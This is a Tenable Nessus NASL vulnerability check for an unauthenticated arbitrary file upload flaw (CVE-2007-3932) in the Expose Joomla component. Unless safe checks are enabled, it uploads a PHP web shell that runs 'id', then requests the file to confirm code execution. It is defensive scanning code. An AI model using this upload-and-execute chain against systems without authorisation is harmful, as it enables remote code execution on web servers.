#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25736);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2007-3932");
  script_bugtraq_id(24958);
  script_xref(name:"OSVDB", value:"41262");

  script_name(english:"Expose for Joomla! (com_expose) uploadimg.php Arbitrary File Upload Code Execution");
  script_summary(english:"Checks whether arbitrary file uploads are possible");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows for arbitrary
file uploads." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Expose, a third-party component for Joomla
for Flash galleries. 

The version of Expose installed on the remote host not only allows
unauthenticated access but also fails to validate the type of files
uploaded.  An attacker can exploit these issues to upload files with
arbitrary code and then execute them on the remote host, subject to
the permissions of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4194" );
 script_set_attribute(attribute:"see_also", value:"http://joomlacode.org/gf/project/expose/news/?action=NewsThreadView&id=441" );
 script_set_attribute(attribute:"solution", value:
"Apply the security patch according to the vendor advisory referenced
above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  url = string(dir, "/administrator/components/com_expose/uploadimg.php");

  # Make sure the affected script exists.
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ('form method="post" action="uploadimg.php"' >< res)
  {
    # Try to upload a file that will execute a command.
    cmd = "id";
    # nb: if safe checks are enabled, move_uploaded_file() will fail.
    if (safe_checks()) fname = "/";
    else fname = string(SCRIPT_NAME, "-", unixtime(), ".php");

    bound = "nessus";
    boundary = string("--", bound);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="userfile"; filename="', fname, '"', "\r\n",
      "Content-Type: application/octet-stream\r\n",
      "\r\n",
      '<?php system(', cmd, ");  ?>\r\n",

      boundary, "--", "\r\n"
    );
    r = http_send_recv3(method: "POST", item: url, version: 11, data: postdata, port: port,
      add_headers: make_array("Content-Type", "multipart/form-data; boundary="+bound));
      # nb: we'll add the Content-Length header and post data later.
    if (isnull(r)) exit(0);
    res = r[2];

    # If safe checks are enabled...
    if (safe_checks())
    {
      # There's a problem if we get a message that the upload failed.
      if ("<script>alert('Error uploading')" >< res)
      {
        report = string(
          "Nessus did not actually upload a file because safe checks were enabled,\n",
          "but the remote install does appear to be invalid."
        );
        security_hole(port:port, extra:report);
      }
    }
    else {
      pat = string("File uploaded to \\.\\./\\.\\./\\.\\.(.+)", fname);
      url2 = NULL;
      matches = egrep(pattern:pat, string:res);
      if (matches)
      {
        foreach match (split(matches))
        {
          match = chomp(match);
          url2 = eregmatch(pattern:pat, string:match);
          if (!isnull(url2))
          {
            url2 = string(dir, url2[1], fname);
            break;
          }
        }
      }
      if (isnull(url2)) exit(0);

      # Now try to execute the script.
      r = http_send_recv3(method:"GET", item:url2, port:port);
      if (isnull(r)) exit(0);
      res = r[2];
    
      # There's a problem if...
      if (
        # the output looks like it's from id or...
        egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
        # PHP's disable_functions prevents running system().
        egrep(pattern:"Warning.+\(\) has been disabled for security reasons", string:res)
      )
      {
        if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
          report = string(
            "Nessus was able to execute the command '", cmd, "' on the remote host,\n",
            "which produced the following output :\n",
            "\n",
            res
          );
        else report = NULL;

        security_hole(port:port, extra: report);
        exit(0);
      }
    }
  }
}
